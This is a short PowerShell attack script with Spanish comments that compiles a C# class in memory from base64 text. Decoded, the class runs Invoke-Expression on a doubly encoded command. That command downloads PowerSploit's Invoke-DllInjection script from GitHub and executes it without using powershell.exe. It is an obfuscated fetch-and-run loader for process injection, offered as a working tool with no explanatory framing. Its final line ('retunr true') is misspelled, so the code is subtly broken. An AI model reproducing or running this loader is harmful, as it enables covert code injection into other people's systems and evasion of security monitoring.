function get-dpshinj{

# Creamos un nuevo objeto para refereniar al proveedor c# que nos ayudara a construir la clase que ejecutará el código powershell en memoria
$csharpProvider = New-Object Microsoft.CSharp.CSharpCodeProvider

# Creamos el compilador

$miCompilador = $csharpProvider.CreateCompiler()

# Asignamos los parámetros de compilación y referenciamos los ensamblados que vamos a necesitar

$Parametros=New-Object System.CodeDom.Compiler.CompilerParameters
$Parametros.GenerateExecutable=$False
$Parametros.GenerateInMemory=$True
$Parametros.IncludeDebugInformation=$False
$Parametros.ReferencedAssemblies.Add("System.dll") > $null
$Parametros.ReferencedAssemblies.Add("System.Core.dll") > $null
$Parametros.ReferencedAssemblies.Add("System.Management.dll") > $null 
$Parametros.ReferencedAssemblies.Add("C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll")> $null 

# Este es el string que contiene la clase que ejecutara el poweshell con la funcion dll inject

$strClase="dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXM7CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb247CgpuYW1lc3BhY2UgcG93ZXJzaGVsbGNvbW1hbmRleGVjCnsKICAgIHB1YmxpYyBjbGFzcyBwc2hleGVjCiAgICB7CgogICAgICAgIHB1YmxpYyAgcHNoZXhlYygpCiAgICAgICAgewoKICAgICAgICAgICAgUnVuc3BhY2VDb25maWd1cmF0aW9uIHJ1bnNwYWNlQ29uZmlndXJhdGlvbiA9IFJ1bnNwYWNlQ29uZmlndXJhdGlvbi5DcmVhdGUoKTsKCiAgICAgICAgICAgIFJ1bnNwYWNlIHJ1bnNwYWNlID0gUnVuc3BhY2VGYWN0b3J5LkNyZWF0ZVJ1bnNwYWNlKHJ1bnNwYWNlQ29uZmlndXJhdGlvbik7CiAgICAgICAgICAgIHJ1bnNwYWNlLk9wZW4oKTsKCiAgICAgICAgICAgIFJ1bnNwYWNlSW52b2tlIHNjcmlwdEludm9rZXIgPSBuZXcgUnVuc3BhY2VJbnZva2UocnVuc3BhY2UpOwoKICAgICAgICAgICAgUGlwZWxpbmUgcGlwZWxpbmUgPSBydW5zcGFjZS5DcmVhdGVQaXBlbGluZSgpOwoKICAgICAgICAgICAgLy9Db21tYW5kIG15Q29tbWFuZCA9IG5ldyBDb21tYW5kKEVuY29kaW5nLlVURjguR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoIlYzSnBkR1V0VDNWMGNIVjAiKSkpIDsKICAgICAgICAgICAgQ29tbWFuZCBteUNvbW1hbmQgPSBuZXcgQ29tbWFuZChFbmNvZGluZy5VVEY4LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKCJTVzUyYjJ0bExVVjRjSEpsYzNOcGIyND0iKSkpOwoKICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmRQYXJhbWV0ZXIgPSAiS0U1bGR5MVBZbXBsWTNRZ2JtVjBMbmRsWW1Oc2FXVnVkQ2t1Wkc5M2JteHZZV1J6ZEhKcGJtY29KMmgwZEhCek9pOHZjbUYzTG1kcGRHaDFZblZ6WlhKamIyNTBaVzUwTG1OdmJTOVFiM2RsY2xOb1pXeHNUV0ZtYVdFdlVHOTNaWEpUY0d4dmFYUXZiV0Z6ZEdWeUwwTnZaR1ZGZUdWamRYUnBiMjR2U1c1MmIydGxMVVJzYkVsdWFtVmpkR2x2Ymk1d2N6RW5LUT09IjsKICAgICAgICAgICAgQ29tbWFuZFBhcmFtZXRlciB0ZXN0UGFyYW0gPSBuZXcgQ29tbWFuZFBhcmFtZXRlcigiQ29tbWFuZCIsIEVuY29kaW5nLlVURjguR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoY29tbWFuZFBhcmFtZXRlcikpKTsKICAgICAgICAgICAgbXlDb21tYW5kLlBhcmFtZXRlcnMuQWRkKHRlc3RQYXJhbSk7CgogICAgICAgICAgICBwaXBlbGluZS5Db21tYW5kcy5BZGQobXlDb21tYW5kKTsKCiAgICAgICAgICAgIC8vIEV4ZWN1dGUgUG93ZXJTaGVsbCBzY3JpcHQKICAgICAgICAgICAgT2JqZWN0IHJlc3VsdHMgPSBwaXBlbGluZS5JbnZva2UoKTsKICAgICAgICAgICAgCiAgICAgICAgfQoKICAgIH0KfQ=="

$Resultado=$csharpProvider.CompileAssemblyFromSource($Parametros,[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($strClase)))

$objClase = $Resultado.CompiledAssembly.CreateInstance("powershellcommandexec.pshexec")


retunr true

}